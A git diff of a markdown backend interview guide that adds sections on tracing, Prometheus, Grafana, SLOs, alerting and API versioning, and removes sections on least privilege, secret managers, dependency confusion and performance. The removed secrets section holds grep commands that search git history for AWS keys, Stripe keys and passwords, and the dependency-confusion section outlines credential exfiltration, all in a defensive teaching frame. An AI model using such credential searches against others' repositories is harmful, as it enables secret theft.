+app.post('/orders', async (req, res) => {
+  // Automatically: if incoming request has trace headers, continue that trace
+  const span = tracer.startSpan('create-order');
+
+  try {
+    span.setAttribute('user.id', req.user.id);
+    span.setAttribute('order.items_count', req.body.items.length);
+
+    // Child span for DB operation
+    const dbSpan = tracer.startSpan('db.insert-order', { parent: span });
+    const order = await db.createOrder(req.body);
+    dbSpan.end();
+
+    // Child span for external service call (payment)
+    const paySpan = tracer.startSpan('payment.charge', { parent: span });
+    await paymentService.charge(order.id, order.total);
+    paySpan.end();
+
+    span.setAttribute('order.id', order.id);
+    span.setStatus({ code: SpanStatusCode.OK });
+    res.status(201).json(order);
+  } catch (err) {
+    span.recordException(err);
+    span.setStatus({ code: SpanStatusCode.ERROR });
+    throw err;
+  } finally {
+    span.end();
+  }
+});
+// Trace shows: API Gateway (10ms) → Order Service (45ms) → DB (5ms) + Payment (38ms)
+// In Jaeger/Zipkin: see entire request timeline as a Gantt chart
+```
+
+> 📖 Reference: [Three Pillars of Observability — Honeycomb](https://www.honeycomb.io/blog/three-pillars-of-observability)
+
+---
+
+**Q42. What is distributed tracing? What is a trace ID and a span?**
+
+**Answer:**
+
+**Distributed tracing** tracks a single request as it flows through multiple services, building a complete picture of what happened and how long each step took.
+
+```
+User request → API Gateway → Order Service → DB
+                          → Payment Service → Stripe API
+                          → Notification Service → SendGrid
+
+Without tracing: "The request took 2 seconds. Which service caused it?"
+With tracing:   "API Gateway: 5ms, Order Service: 180ms (DB: 5ms, Payment: 175ms!)"
+→ Immediately identify Payment Service is the bottleneck
+```
+
+**Trace ID and Span:**
+
+```
+Trace ID: A unique identifier for the ENTIRE request journey across ALL services
+Span:     A single unit of work within the trace (one service operation, one DB call)
+Parent Span: A span that contains child spans (hierarchical)
+
+Example trace:
+Trace ID: abc-123-xyz
+
+Span 1 (root):   POST /orders             duration: 200ms  service: api-gateway
+  Span 2:        create-order             duration: 195ms  service: order-service
+    Span 3:      db.insert-order          duration:   8ms  service: order-service (DB)
+    Span 4:      payment.charge           duration: 185ms  service: order-service
+      Span 5:    stripe.charge-card       duration: 180ms  service: payment-service
+        Span 6:  http.post stripe-api     duration: 175ms  service: payment-service (external)
+    Span 7:      notify.send-confirmation duration:   2ms  service: order-service (async)
+```
+
+```js
+// Propagation: trace headers passed between services
+// Order Service calls Payment Service:
+const response = await fetch('http://payment-service/charge', {
+  headers: {
+    'traceparent': `00-${traceId}-${spanId}-01`,  // W3C trace context standard
+    // Payment Service receives this → continues the same trace → adds its own spans
+  }
+});
+
+// OpenTelemetry auto-instruments HTTP clients:
+// @opentelemetry/instrumentation-http automatically adds trace headers to all outgoing requests
+// No manual code needed for propagation ✅
+```
+
+> 📖 Reference: [Distributed Tracing — OpenTelemetry](https://opentelemetry.io/docs/concepts/observability-primer/)
+
+---
+
+**Q43. What is Prometheus? How does it scrape and store metrics?**
+
+**Answer:**
+
+**Prometheus** is an open-source monitoring and alerting system that collects metrics by **pulling** (scraping) HTTP endpoints from your services at regular intervals and stores them in a time-series database.
+
+```
+Architecture:
+
+Your App (exposes /metrics)   ← Prometheus scrapes every 15s
+Your DB (postgres_exporter)   ← Prometheus scrapes every 15s
+Your K8s nodes (node-exporter)← Prometheus scrapes every 15s
+
+All scraped metrics → Prometheus TSDB (local storage, 15-day default retention)
+                    → Grafana queries via PromQL for dashboards
+                    → AlertManager evaluates rules → PagerDuty/Slack alerts
+```
+
+```js
+// Exposing metrics from Node.js app
+const prometheus = require('prom-client');
+prometheus.collectDefaultMetrics(); // CPU, memory, event loop, GC, etc.
+
+// Custom business metrics
+const ordersCreated = new prometheus.Counter({
+  name: 'orders_created_total',
+  help: 'Total number of orders created',
+  labelNames: ['status', 'payment_method']
+});
+
+const orderValue = new prometheus.Histogram({
+  name: 'order_value_dollars',
+  help: 'Order value distribution',
+  buckets: [10, 50, 100, 500, 1000, 5000]
+});
+
+// Expose metrics endpoint
+app.get('/metrics', async (req, res) => {
+  res.set('Content-Type', prometheus.register.contentType);
+  res.end(await prometheus.register.metrics());
+});
+
+// Use metrics
+app.post('/orders', async (req, res) => {
+  const order = await createOrder(req.body);
+  ordersCreated.inc({ status: 'success', payment_method: order.paymentMethod });
+  orderValue.observe(order.total);
+  res.json(order);
+});
+```
+
+```yaml
+# Prometheus config (prometheus.yml)
+global:
+  scrape_interval: 15s
+
+scrape_configs:
+  - job_name: 'api-service'
+    static_configs:
+      - targets: ['api-service:3000']  # scrapes /metrics endpoint
+
+  # Kubernetes auto-discovery
+  - job_name: 'kubernetes-pods'
+    kubernetes_sd_configs:
+      - role: pod
+    relabel_configs:
+      - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
+        action: keep
+        regex: 'true'  # scrape pods annotated with prometheus.io/scrape: "true"
+```
+
+```promql
+# PromQL queries:
+# Request rate (per second, 5-min window)
+rate(http_requests_total[5m])
+
+# Error rate (percentage)
+sum(rate(http_requests_total{status_code=~"5.."}[5m]))
+/
+sum(rate(http_requests_total[5m]))
+
+# p95 latency
+histogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m]))
+
+# Alert: error rate > 5%
+ALERT HighErrorRate
+  IF (rate(http_requests_total{status="500"}[5m]) / rate(http_requests_total[5m])) > 0.05
+  FOR 2m
+  LABELS { severity = "critical" }
+```
+
+> 📖 Reference: [Prometheus Overview — Prometheus Docs](https://prometheus.io/docs/introduction/overview/)
+
+---
+
+**Q44. What is Grafana? How does it complement Prometheus?**
+
+**Answer:**
+
+**Grafana** is an open-source visualization and dashboarding platform. It queries data sources (Prometheus, Loki, InfluxDB, Elasticsearch, etc.) and renders beautiful dashboards, graphs, and alerts.
+
+```
+Prometheus: stores metrics, powerful querying (PromQL), alerting
+Grafana:    visualizes metrics, creates dashboards, routes alerts to channels
+
+They complement each other:
+Prometheus = data collection + storage + PromQL engine
+Grafana    = visualization + dashboard + multi-source correlation
+```
+
+**Practical setup:**
+
+```yaml
+# docker-compose.yml — local monitoring stack
+services:
+  prometheus:
+    image: prom/prometheus:latest
+    volumes:
+      - ./prometheus.yml:/etc/prometheus/prometheus.yml
+    ports: ['9090:9090']
+
+  grafana:
+    image: grafana/grafana:latest
+    ports: ['3000:3000']
+    environment:
+      GF_SECURITY_ADMIN_PASSWORD: admin
+    volumes:
+      - grafana_data:/var/lib/grafana
+      - ./grafana/dashboards:/etc/grafana/provisioning/dashboards
+      - ./grafana/datasources:/etc/grafana/provisioning/datasources
+
+  # Log aggregation
+  loki:
+    image: grafana/loki:latest
+    ports: ['3100:3100']
+
+  promtail:
+    image: grafana/promtail:latest
+    volumes:
+      - /var/log:/var/log
+      - ./promtail-config.yml:/etc/promtail/config.yml
+```
 
 ```json
-// ❌ App role with AdministratorAccess — can do ANYTHING
-{ "Effect": "Allow", "Action": "*", "Resource": "*" }
-
-// ✅ App role with minimal permissions for what it actually does
+// Grafana dashboard JSON (provisioned from code)
 {
-  "Version": "2012-10-17",
-  "Statement": [
+  "title": "API Service Overview",
+  "panels": [
     {
-      "Effect": "Allow",
-      "Action": ["s3:GetObject", "s3:PutObject"],
-      "Resource": "arn:aws:s3:::my-app-uploads/*"  // only this specific bucket
+      "title": "Request Rate",
+      "type": "graph",
+      "targets": [{
+        "expr": "sum(rate(http_requests_total[1m])) by (route)",
+        "legendFormat": "{{route}}"
+      }]
     },
     {
-      "Effect": "Allow",
-      "Action": ["ses:SendEmail"],
-      "Resource": "*"
+      "title": "Error Rate",
+      "type": "stat",
+      "targets": [{
+        "expr": "sum(rate(http_requests_total{status_code=~\"5..\"}[5m])) / sum(rate(http_requests_total[5m])) * 100",
+        "legendFormat": "Error %"
+      }],
+      "thresholds": { "steps": [
+        { "value": 0, "color": "green" },
+        { "value": 1, "color": "yellow" },
+        { "value": 5, "color": "red" }
+      ]}
     },
     {
-      "Effect": "Allow",
-      "Action": ["sqs:SendMessage", "sqs:ReceiveMessage", "sqs:DeleteMessage"],
-      "Resource": "arn:aws:sqs:us-east-1:123456789:my-app-queue"  // only this queue
+      "title": "p95 Latency",
+      "targets": [{
+        "expr": "histogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m]))"
+      }]
     }
   ]
 }
 ```
 
-**Applied to application code:**
-
-```js
-// ❌ API endpoint doing too much
-app.get('/orders', requireAuth, async (req, res) => {
-  // Regular users should only see THEIR orders
-  const orders = await db.query('SELECT * FROM orders'); // returns ALL orders!
-});
-
-// ✅ Scoped by caller's identity
-app.get('/orders', requireAuth, async (req, res) => {
-  const filter = req.user.role === 'admin'
-    ? {}                                    // admins can see all
-    : { where: { userId: req.user.userId } }; // users see only theirs
-
-  const orders = await Order.findAll(filter);
-  res.json(orders);
-});
+**Grafana + Loki (logs):**
+```
+Grafana can correlate:
+- See a spike in error rate in Prometheus graph
+- Click the spike time → automatically query Loki for logs at that exact time
+- See the error logs that caused the spike
+→ One tool for metrics + logs + traces (Grafana Tempo)
 ```
 
-> 📖 Reference: [Least Privilege — OWASP](https://owasp.org/www-community/vulnerabilities/Least_Privilege_Violation)
+> 📖 Reference: [Grafana Docs](https://grafana.com/docs/grafana/latest/introduction/)
 
 ---
 
-**Q51. What is a secret manager? Why should you never store secrets in your codebase?**
+**Q45. What is an SLI, SLO, and SLA? How do they differ?**
 
 **Answer:**
 
-A **secret manager** is a secure, centralized service for storing, retrieving, rotating, and auditing sensitive credentials (API keys, DB passwords, certificates).
+These three terms define service reliability commitments at different levels:
 
-**Why never store secrets in code:**
+| Term | Full Name | What it is | Example |
+|------|-----------|-----------|---------|
+| **SLI** | Service Level Indicator | A metric that measures service behavior | 99.2% of requests succeeded in the last 30 days |
+| **SLO** | Service Level Objective | An internal target for an SLI | 99.9% of requests must succeed (our goal) |
+| **SLA** | Service Level Agreement | A contract with external consequences | 99.9% uptime or customer gets a refund |
 
-```bash
-# ❌ Committed to git — discovered by attackers within minutes via GitHub search
-git grep "AKIA"          # finds AWS access keys
-git grep "sk_live_"      # finds Stripe live keys
-git log --all -p | grep "password"  # searches full git history
+```
+SLI ← the actual measured number
+SLO ← the internal target we aim to meet
+SLA ← the external commitment with financial consequences
 
-# ❌ These scenarios are common:
-# - Developer accidentally pushes .env file
-# - Secret in a config file committed without thinking
-# - Secret in a log file committed as "logs for debugging"
-# Even if you delete the file: git history NEVER forgets
+SLO should be stricter than SLA:
+SLO: 99.95% availability (internal goal)
+SLA: 99.9% availability (external commitment)
+Buffer: 0.05% → room to miss SLO without breaching SLA
 ```
 
-**Secret manager examples:**
+**Real implementation:**
 
 ```js
-// ── AWS Secrets Manager ───────────────────────────────────────────────
-const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');
-const client = new SecretsManagerClient({ region: 'us-east-1' });
+// SLIs as Prometheus metrics and PromQL queries
 
-async function getSecret(secretName) {
-  const { SecretString } = await client.send(
-    new GetSecretValueCommand({ SecretId: secretName })
-  );
-  return JSON.parse(SecretString);
-}
+// SLI 1: Availability (success rate)
+// "Fraction of successful HTTP requests over all requests"
+const availabilitySLI = `
+  sum(rate(http_requests_total{status_code!~"5.."}[30d]))
+  /
+  sum(rate(http_requests_total[30d]))
+`;
+// Current: 99.92% → SLO: 99.9% → ✅ within SLO
 
-// At startup: fetch secrets from AWS
-const dbCredentials = await getSecret('myapp/production/database');
-// Returns: { host: 'prod-db.xyz', user: 'app', password: 'random-generated-pass' }
+// SLI 2: Latency
+// "Fraction of requests that complete within 200ms"
+const latencySLI = `
+  sum(rate(http_request_duration_seconds_bucket{le="0.2"}[30d]))
+  /
+  sum(rate(http_request_duration_seconds_count[30d]))
+`;
+// Current: 94.3% → SLO: 95% → ❌ violating SLO!
 
-const pool = new Pool({
-  host:     dbCredentials.host,
-  user:     dbCredentials.user,
-  password: dbCredentials.password, // never hardcoded ✅
-  database: 'myapp'
-});
-
-// ── HashiCorp Vault ────────────────────────────────────────────────────
-const vault = require('node-vault')({ endpoint: 'https://vault.internal.company.com' });
-
-const { data } = await vault.read('secret/myapp/stripe');
-const stripeClient = new Stripe(data.secretKey); // fetched from Vault, not .env
-
-// ── Benefits of secret managers ───────────────────────────────────────
-// ✅ Automatic rotation: DB password rotated every 30 days without code changes
-// ✅ Audit log: who accessed which secret, when
-// ✅ Fine-grained access: prod service can only read prod secrets
-// ✅ Encryption at rest and in transit
-// ✅ No secrets in code, environment files, or logs
+// SLI 3: Error rate
+// "Fraction of requests returning 5xx errors"
+const errorRateSLI = `
+  sum(rate(http_requests_total{status_code=~"5.."}[30d]))
+  /
+  sum(rate(http_requests_total[30d]))
+`;
 ```
 
-> 📖 Reference: [Secrets Management — AWS Secrets Manager](https://aws.amazon.com/secrets-manager/)
+**Error budget:** `1 - SLO`
+
+```
+SLO: 99.9% availability for 30 days
+Error budget: 0.1% = 43.8 minutes of downtime allowed per month
+
+Spending error budget:
+- Incident: 15 minutes down → 15 min spent from 43.8 min budget
+- Remaining: 28.8 minutes this month
+
+If error budget depleted:
+→ Freeze new feature deployments until next period
+→ Focus on reliability improvements
+→ This creates natural incentive to balance velocity vs reliability
+```
+
+> 📖 Reference: [SLI/SLO/SLA — Google SRE Book](https://sre.google/sre-book/service-level-objectives/)
 
 ---
 
-**Q52. What is dependency confusion / supply chain attack? How do you protect against it?**
+**Q46. What is an alert fatigue? How do you design a good alerting strategy?**
 
 **Answer:**
 
-**Dependency Confusion** exploits the way package managers (npm, pip, etc.) resolve package names. If an internal package name matches a public package, the manager might install the public (malicious) one instead of the internal one.
-
-**The attack (Alex Birsan's research, 2021):**
+**Alert fatigue** happens when the on-call engineer receives so many alerts (many of them false positives, noisy, or non-actionable) that they start ignoring them — including real critical ones.
 
 ```
-Company uses internal packages:
-  @company/auth-lib (hosted on private registry at npm.company.com)
-  @company/db-utils (also internal)
-
-Attacker discovers internal package names (from job posts, error messages, config files)
-Attacker publishes malicious packages to PUBLIC npm with the SAME names:
-  @company/auth-lib  version 9.9.9 (higher than internal 1.2.0)
-  @company/db-utils  version 9.9.9
-
-npm's default behavior: public registry takes precedence for scoped packages
-→ CI/CD installs ATTACKER's package instead of internal one
-→ package.json postinstall script runs → attacker has code execution!
-→ AWS credentials, environment variables exfiltrated
+Signs of alert fatigue:
+- "I just acknowledge and silence it, it usually resolves itself"
+- Hundreds of alerts per day, most not requiring action
+- On-call is woken up at 3 AM for things that auto-recovered
+- Team ignores alerts → real incident missed → major outage
 ```
 
-**How to protect your backend:**
-
-```bash
-# ── npm: configure scoped packages to internal registry ──────────────
-# .npmrc
-@company:registry=https://npm.company.internal/
-# All @company/* packages ONLY come from internal registry
-
-# ── Use exact package names with scope ────────────────────────────────
-# package.json
-{
-  "dependencies": {
-    "@company/auth-lib": "1.2.0"   # scoped → internal registry ✅
-  }
-}
-
-# ── Lock file + integrity checking ────────────────────────────────────
-# package-lock.json stores SHA-512 hashes of each package
-# npm ci validates hashes on install → any tampered package fails
-
-# ── Private packages: publish internal names to npm to "claim" them ───
-# Even if the package does nothing, it prevents attackers from uploading
-# with higher version numbers
-
-# ── Audit regularly ────────────────────────────────────────────────────
-npm audit                           # check for known vulnerabilities
-npx snyk test                       # deeper supply chain analysis
-```
-
-```js
-// ── Verify package integrity in CI ──────────────────────────────────
-// GitHub Actions
-steps:
-  - name: Install dependencies
-    run: npm ci  # uses package-lock.json — fails if integrity mismatch
-
-  - name: Security audit
-    run: npm audit --audit-level=high
-
-  - name: SBOM generation (Software Bill of Materials)
-    run: npx @cyclonedx/cyclonedx-npm --output-file sbom.json
-    # Lists every dependency — reviewable by security team
-```
-
-> 📖 Reference: [Dependency Confusion — Alex Birsan](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
-
----
-
-## 9. Performance & Scalability Basics
-
----
-
-**Q53. What is latency vs throughput? How do you measure them?**
-
-**Answer:**
-
-- **Latency:** Time for a single operation to complete (response time for one request). Measured in ms.
-- **Throughput:** Number of operations completed per unit of time (requests per second). Measured in req/sec, TPS.
-
-**They're not the same — and often trade off against each other:**
-
-```
-Example: Processing 1000 requests
-Low latency + low throughput: each request takes 1ms, but only 1 at a time → 1000ms total
-High throughput + acceptable latency: 100 parallel, each 10ms → 100ms total
-```
-
-**Measuring with tools:**
-
-```bash
-# ── k6 load test ──────────────────────────────────────────────────────
-# k6 script (script.js)
-import http from 'k6/http';
-import { check, sleep } from 'k6';
-
-export let options = {
-  vus:      100,           // 100 virtual users (concurrent)
-  duration: '30s',
-  thresholds: {
-    http_req_duration: ['p(95)<200'],  // 95% of requests under 200ms
-    http_req_failed:   ['rate<0.01'],  // error rate under 1%
-  }
-};
-
-export default function() {
-  const res = http.get('https://api.myapp.com/users');
-  check(res, { 'status 200': r => r.status === 200 });
-  sleep(1);
-}
-
-# Run:
-k6 run script.js
-
-# Output:
-# http_req_duration: avg=45.2ms  min=12ms  med=38ms  max=892ms  p(90)=82ms  p(95)=120ms  p(99)=340ms
-# http_reqs:         1523 req/s
-# http_req_failed:   0.02%
-```
-
-```bash
-# ── Apache Bench (quick test) ─────────────────────────────────────────
-ab -n 1000 -c 100 https://api.myapp.com/health
-# -n 1000: 1000 total requests
-# -c 100: 100 concurrent
-
-# Output:
-# Requests per second:    892.34 [#/sec]       ← throughput
-# Time per request:       112.06 [ms] (mean)    ← latency (avg)
-# Time per request:       1.121 [ms] (mean, across all concurrent)
-# Transfer rate:          245.67 [Kbytes/sec]
-```
-
-**Metrics to track in production:**
-
-```js
-// In Prometheus/Grafana, track:
-// • http_request_duration_seconds (histogram) → p50, p95, p99 latency
-// • http_requests_total (counter) → requests per second
-// • error_rate = http_requests_total{status=~"5.."} / http_requests_total
-```
-
-> 📖 Reference: [Latency vs Throughput — AWS](https://aws.amazon.com/compare/the-difference-between-throughput-and-latency/)
-
----
-
-**Q54. What is a load balancer? What is the difference between round-robin and least-connections algorithms?**
-
-**Answer:**
-
-A **load balancer** distributes incoming requests across multiple backend server instances, preventing any one server from being overwhelmed.
-
-```
-Without LB:           With LB:
-                       ┌──────────────────┐
-Client ──────► Server  │   Load Balancer  │──► Server 1 (30% load)
-(all traffic on one)   │   :443/:80       │──► Server 2 (35% load)
-                       └──────────────────┘──► Server 3 (35% load)
-```
-
-**Load balancing algorithms:**
-
-```
-Round-Robin: Requests go to servers in rotation (1→2→3→1→2→3→...)
-  Request 1 → Server 1
-  Request 2 → Server 2
-  Request 3 → Server 3
-  Request 4 → Server 1 (back to start)
-
-Problem: All requests treated as equal — but some take 10ms, others take 5 seconds
-         Server 1 might be processing a slow request while Server 2 is idle
-
-Least-Connections: Route to server with fewest active connections
-  Server 1: 10 active connections
-  Server 2: 2 active connections  ← next request goes here
-  Server 3: 7 active connections
-  Better for heterogeneous request durations ✅
-
-IP Hash: Same client IP always goes to same server (session affinity)
-  Good for: stateful sessions (when you can't use Redis for session state)
-
-Weighted Round-Robin: Servers get traffic proportional to their weight
-  Server 1 (weight=3): gets 3x requests (more powerful machine)
-  Server 2 (weight=1): gets 1x requests
-```
-
-**NGINX load balancer config:**
-
-```nginx
-upstream backend {
-  least_conn;                        # algorithm: least connections
-
-  server app1.internal:3000 weight=3; # 3x traffic (more powerful)
-  server app2.internal:3000 weight=1;
-  server app3.internal:3000 weight=1;
-
-  keepalive 32;                      # reuse connections to backend
-}
-
-server {
-  listen 80;
-
-  location / {
-    proxy_pass http://backend;
-    proxy_set_header X-Real-IP $remote_addr;
-    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-
-    # Health check — remove dead servers
-    proxy_next_upstream error timeout;
-    proxy_connect_timeout 1s;
-    proxy_read_timeout 10s;
-  }
-
-  # Health check endpoint (NGINX Plus)
-  location /health {
-    health_check interval=5s fails=2 passes=2 uri=/health;
-  }
-}
-```
-
-> 📖 Reference: [Load Balancing — NGINX](https://www.nginx.com/resources/glossary/load-balancing/)
-
----
-
-**Q55. What is connection keep-alive? How does it improve HTTP performance?**
-
-**Answer:**
-
-**HTTP Keep-Alive** (persistent connections) reuses the same TCP connection for multiple HTTP requests instead of opening a new connection for each one.
-
-**Why TCP connection setup is expensive:**
-
-```
-Without Keep-Alive (HTTP/1.0):
-Request 1: TCP SYN → SYN-ACK → ACK → HTTP GET → Response → FIN/ACK  (~50ms)
-Request 2: TCP SYN → SYN-ACK → ACK → HTTP GET → Response → FIN/ACK  (~50ms)
-Request 3: TCP SYN → SYN-ACK → ACK → HTTP GET → Response → FIN/ACK  (~50ms)
-Total: 3 × 50ms = 150ms
-
-With Keep-Alive (HTTP/1.1 default):
-TCP SYN → SYN-ACK → ACK            (one-time TCP setup: ~15ms)
-Request 1: HTTP GET → Response      (~5ms)
-Request 2: HTTP GET → Response      (~5ms)  ← reuses same connection
-Request 3: HTTP GET → Response      (~5ms)
-Total: 15ms + 3 × 5ms = 30ms  ← 5x faster!
-```
-
-```js
-// ── Node.js HTTP server keep-alive ────────────────────────────────────
-const http = require('http');
-const server = http.createServer(app);
-
-server.keepAliveTimeout = 65000;  // 65 seconds (longer than AWS ALB's 60s timeout)
-server.headersTimeout  = 66000;   // slightly longer than keepAliveTimeout
-
-// ── Axios: reuse connections with HTTP Agent ──────────────────────────
-const https = require('https');
-const axios  = require('axios');
-
-const httpsAgent = new https.Agent({
-  keepAlive:    true,
-  maxSockets:   100,     // max concurrent connections
-  maxFreeSockets: 10,    // keep 10 idle connections ready
-  timeout:      60000,   // idle timeout
-});
-
-const apiClient = axios.create({
-  httpsAgent,            // reuse TCP connections across requests
-  baseURL: 'https://api.partner.com'
-});
-
-// Without this: each axios.get() opens a NEW TCP connection → slow
-// With this: connections are reused → much faster for many requests
-
-// ── Response headers ──────────────────────────────────────────────────
-// HTTP/1.1: keep-alive is default, must opt-out with Connection: close
-// HTTP/2: multiplexing makes keep-alive implicit (multiple streams, 1 connection)
-
-// Check with curl:
-// curl -v https://api.myapp.com/health
-// < Connection: keep-alive
-// < Keep-Alive: timeout=65
-```
-
-> 📖 Reference: [HTTP Keep-Alive — MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Keep-Alive)
-
----
-
-**Q56. What is database read replica? When and why would you use one?**
-
-**Answer:**
-
-A **read replica** is a copy of the primary database that receives all writes replicated from the primary and can serve read queries. Writes always go to the primary; reads can go to any replica.
-
-```
-Without read replica:
-All queries → Primary DB → overloaded → slow
-
-With read replica:
-Writes → Primary DB → replicates to →  Replica 1
-Reads  →                                Replica 2
-                                         Replica 3
-→ Primary handles writes only, replicas share read load
-```
-
-**When to use:**
-
-```js
-// ── Use case 1: Read-heavy workload (e.g., 90% reads, 10% writes) ────
-// Route heavy read queries to replica
-const primaryPool  = new Pool({ host: process.env.DB_PRIMARY_HOST });
-const replicaPool  = new Pool({ host: process.env.DB_REPLICA_HOST });
-
-// Write to primary
-async function createUser(data) {
-  return primaryPool.query('INSERT INTO users ... RETURNING *', [data]);
-}
-
-// Read from replica (slight staleness acceptable)
-async function getUserById(id) {
-  return replicaPool.query('SELECT * FROM users WHERE id = $1', [id]);
-}
-
-// ── Use case 2: Expensive analytics queries ───────────────────────────
-// Run heavy reports on replica — doesn't slow down production traffic
-async function generateMonthlyReport() {
-  return replicaPool.query(`
-    SELECT u.name, SUM(o.total) as revenue, COUNT(o.id) as order_count
-    FROM users u JOIN orders o ON u.id = o.user_id
-    WHERE o.created_at >= date_trunc('month', NOW())
-    GROUP BY u.id ORDER BY revenue DESC
-    LIMIT 100
-  `); // runs on replica — primary completely unaffected ✅
-}
-
-// ── Caveat: replication lag ─────────────────────────────────────────
-// Replicas are slightly behind primary (typically 0-100ms)
-// AFTER writing, immediately reading may return stale data
-
-// ❌ Potential race condition
-const user = await createUser(data);
-const fetched = await getUserById(user.id); // might not yet be on replica!
-
-// ✅ Read-your-own-writes: use primary for reads immediately after writes
-async function registerUser(data) {
-  const user = await createUser(data); // write to primary
-  return primaryPool.query(             // read from PRIMARY for consistency
-    'SELECT * FROM users WHERE id = $1', [user.id]
-  );
-}
-```
-
-**AWS RDS Read Replica setup:**
+**Designing a good alerting strategy:**
 
 ```yaml
-# Terraform example
-resource "aws_db_instance" "primary" {
-  identifier     = "myapp-primary"
-  engine         = "postgres"
-  instance_class = "db.r6g.xlarge"
-  multi_az       = true  # high availability
-}
+# ── Rule 1: Alert on symptoms, not causes ─────────────────────────────
+# BAD: "CPU > 80%" — so what? Maybe it's fine. Users aren't impacted yet.
+# GOOD: "Error rate > 1%" — users are experiencing errors right now
 
-resource "aws_db_instance" "replica" {
-  identifier          = "myapp-replica-1"
-  replicate_source_db = aws_db_instance.primary.identifier
-  instance_class      = "db.r6g.large"  # can be smaller if only reads
-}
+# BAD: "DB connection pool at 80% capacity"
+# GOOD: "API p95 latency > 500ms" (which may be caused by DB pool exhaustion)
+
+# ── Rule 2: Every alert must be actionable ────────────────────────────
+# If you can't DO something about it, don't page
+# Either fix it or add it to a dashboard for passive monitoring
+
+# ── Rule 3: Alerts should have clear urgency levels ────────────────────
+# P1 (page immediately):  User-facing outage, revenue impact, data loss
+# P2 (page during hours): Degraded performance, non-critical failure
+# P3 (ticket only):       Warning threshold crossed, investigate tomorrow
+
+# ── Prometheus alerting rules ─────────────────────────────────────────
+groups:
+- name: api-service
+  rules:
+
+  # P1: Error rate spike (wake someone up NOW)
+  - alert: HighErrorRate
+    expr: |
+      sum(rate(http_requests_total{status_code=~"5.."}[5m]))
+      /
+      sum(rate(http_requests_total[5m])) > 0.05
+    for: 2m          # sustained for 2 minutes (not a blip)
+    labels:
+      severity: critical
+    annotations:
+      summary: "High error rate on {{ $labels.service }}"
+      description: "Error rate is {{ $value | humanizePercentage }} (threshold: 5%)"
+      runbook: "https://runbooks.company.com/high-error-rate"
+
+  # P2: Elevated latency (investigate soon)
+  - alert: HighLatency
+    expr: |
+      histogram_quantile(0.95,
+        rate(http_request_duration_seconds_bucket[5m])
+      ) > 1.0
+    for: 5m
+    labels:
+      severity: warning
+    annotations:
+      summary: "p95 latency above 1s"
+
+  # P3: Error budget burn rate (plan for reliability work)
+  - alert: ErrorBudgetBurning
+    expr: |
+      (
+        1 - (
+          sum(rate(http_requests_total{status_code!~"5.."}[1h]))
+          / sum(rate(http_requests_total[1h]))
+        )
+      ) > (0.001 * 14.4)   # burning 14.4x faster than budget allows
+    labels:
+      severity: warning     # don't page — just create a ticket
 ```
 
-> 📖 Reference: [Read Replicas — AWS RDS Docs](https://aws.amazon.com/rds/features/read-replicas/)
+**Alert checklist:**
+- [ ] Does this alert indicate a user is being impacted right now?
+- [ ] Is there a specific action to take when this fires?
+- [ ] Is the `for` duration long enough to avoid false positives?
+- [ ] Does the alert link to a runbook?
+- [ ] Who is responsible for triaging this alert?
+
+> 📖 Reference: [Alerting — Google SRE Book](https://sre.google/sre-book/monitoring-distributed-systems/)
 
 ---
 
-**Q57. What is a flame graph? How is it used to profile backend performance?**
+## 8. Advanced API Design
+
+---
+
+**Q47. What is API backward compatibility? How do you make a breaking change safely?**
 
 **Answer:**
 
-A **flame graph** is a visualization of a performance profile — it shows where CPU time is spent across the call stack. Wide boxes = more time spent. The call stack grows upward (bottom = entry point, top = deepest call).
+**API backward compatibility** means existing clients continue to work unchanged after an API update. A **breaking change** removes, renames, or fundamentally changes behavior in a way that breaks existing clients.
+
+**Breaking vs non-breaking changes:**
 
 ```
-How to read a flame graph:
-y-axis: call depth (top = deepest function call)
-x-axis: percentage of total time (width = % of CPU time)
-Color:  random (for visual distinction) — not meaningful
+✅ Non-breaking (safe to deploy):
+  - Add a new optional field to response
+  - Add a new endpoint
+  - Add a new optional query parameter
+  - Add a new enum value (if clients handle unknown values)
 
-          ┌───[handleRequest 3%]──┐
-          └──────────────────────┘
-     ┌────────[db.query 8%]────────────────────────────┐
-     └────────────────────────────────────────────────┘
-┌─────────────────────[processOrder 25%]────────────────────────────────────────────┐
-└────────────────────────────────────────────────────────────────────────────────────┘
-
-→ processOrder takes 25% of CPU time → this is the hotspot to optimize!
+❌ Breaking changes (require versioning):
+  - Rename/remove a field from response
+  - Change field type (string → integer)
+  - Change URL structure
+  - Make optional parameter required
+  - Remove an endpoint
+  - Change authentication method
 ```
 
-**Generating a flame graph for Node.js:**
+**Safe breaking change process:**
 
-```bash
-# ── Method 1: clinic.js (easiest) ────────────────────────────────────
-npm install -g clinic
-clinic flame -- node app.js
-# Runs app, samples CPU, generates interactive flame graph in browser
-# Open: .clinic/12345.clinic-flame/index.html
+```js
+// ── Expand-contract pattern ───────────────────────────────────────────
 
-# ── Method 2: 0x (focused on Node.js) ────────────────────────────────
-npm install -g 0x
-0x -- node app.js
-# Send load to your app:
-ab -n 5000 -c 50 http://localhost:3000/api/orders
-# Press Ctrl+C → generates flamegraph.html
+// CURRENT API (v1):
+// GET /users/:id → { id, name, email, created_at }
 
-# ── Method 3: Node.js built-in profiler ──────────────────────────────
-node --prof app.js         # generate isolate-*.log file
-node --prof-process isolate-0xNN.log > profile.txt
-# Then use d8 or flamebearer to visualize
+// DESIRED CHANGE: rename "name" → "fullName", add "firstName", "lastName"
+
+// ❌ BAD: Just rename it
+// { id, fullName, email } ← breaks all clients using "name" field
+
+// ✅ GOOD: Three-phase migration
+
+// Phase 1: Expand — return BOTH old and new fields simultaneously
+app.get('/v1/users/:id', async (req, res) => {
+  const user = await User.findById(req.params.id);
+  res.json({
+    id:         user.id,
+    name:       user.fullName,    // OLD field (kept for backward compat)
+    fullName:   user.fullName,    // NEW field (clients can start using)
+    firstName:  user.firstName,   // NEW field
+    lastName:   user.lastName,    // NEW field
+    email:      user.email,
+    created_at: user.createdAt,
+  });
+  // All old clients still work (name is there)
+  // New clients can use fullName/firstName/lastName
+});
+
+// Phase 2: Migrate — communicate deprecation, update all known clients
+// Add deprecation headers:
+res.set('Deprecation', 'true');
+res.set('Sunset', 'Sat, 31 Dec 2025 23:59:59 GMT');
